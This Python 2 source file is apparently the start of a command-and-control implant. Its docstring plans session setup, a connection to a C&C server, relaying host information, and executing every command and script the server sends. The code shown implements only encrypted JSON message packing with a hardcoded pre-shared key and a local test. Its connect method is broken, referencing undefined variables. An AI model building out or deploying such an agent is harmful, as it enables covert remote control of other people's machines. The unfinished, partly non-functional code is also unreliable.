#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Agent needs to do the following:
    [*] Create session id
    [*] Create a socket and connect to C&C
    [*] Encrypt all communications with PSK
    [*] Relay host information and other vitals
    [*] Ask for commands
    [*] Execute all commands and scripts

    {
        "session_id": 123456 // current session id
        "message_type": "HELLO" // HELLO, COMMAND, FILE, SCRIPT, GOODBYE
        "data": "saasfsdfsfsafsafasf"
    }
"""

################################################################################
################################################################################
################################################################################

# Command and control IP address
CC_IP_ADDRESS = "127.0.0.1"

# Command and control port numbers
CC_PORT = 8080

# Agent Pre-shared key
AGENT_PSK = "abc123"

################################################################################
################################################################################
################################################################################

# Standard Imports
from Crypto import Random
from Crypto.Cipher import AES
import socket
import uuid
import base64
import json

class Agent(object):
    """
    Agent class that will handle all functionality to work with C&C
    """

    def __init__(self):
        """
        Agent constructor
        """
        self.session_id = str(uuid.uuid4())
        self.sock = None

################################################################################
################################################################################

    def connect(self):
        """
        Connect to command and control
        """
        try:
            self.sock = socket.socket()
            self.sock.connect((host, port))
        except Exception, e_obj:
            print "ERROR: {0}".format(str(e_obj))
        return response

################################################################################
################################################################################

    def _pack(self, message_type, data):
        """
        Pack the data base64 string
        """
        response = ""
        try:
            response_dict = {
                "session_id": self.session_id,
                "message_type": message_type,
                "data": data
            }
            data_str = json.dumps(response_dict)
            response = self._encrypt(data_str, AGENT_PSK)
        except Exception, e_obj:
            print "ERROR: {0}".format(str(e_obj))
        return response

    def _unpack(self, message):
        """
        Unpack the message into a usable dictionary
        """
        response = {}
        try:
            data_str = self._decrypt(message, AGENT_PSK)
            response = json.loads(data_str)
        except Exception, e_obj:
            print "ERROR: {0}".format(str(e_obj))
        return response

    def _pad(self, current_string, current_length=32, pad_with="{"):
        """
        Pad AES key with chars to match length
        """
        while len(current_string) < current_length:
            current_string += str(pad_with)
        return current_string

    def _encrypt(self, plaintext, shared_key):
        """
        Encrypt plaintext values with pre-shared key
        """
        encrypted_str = ""
        try:
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(self._pad(shared_key), AES.MODE_CFB, iv)
            encrypted_str = base64.b64encode(iv + cipher.encrypt(plaintext))
        except Exception, e_obj:
            print "ERROR: {0}".format(str(e_obj))
        return encrypted_str

    def _decrypt(self, ciphertext, shared_key):
        """
        Decrypt ciphertext values with pre-shared key
        """
        decrypted_str = ""
        try:
            ciphertext = base64.b64decode(ciphertext)
            iv = ciphertext[:AES.block_size]
            cipher = AES.new(self._pad(shared_key), AES.MODE_CFB, iv)
            decrypted_str = cipher.decrypt(ciphertext[AES.block_size:])
        except Exception, e_obj:
            print "ERROR: {0}".format(str(e_obj))
        return decrypted_str

################################################################################
################################################################################

a_obj = Agent()

test_key = "abc123"
test_phrase = "This is a test"

a_obj = Agent()

encrypted_str = a_obj._pack("test", test_phrase)
print encrypted_str

decrypted_dict = a_obj._unpack(encrypted_str)
print decrypted_dict["message_type"]
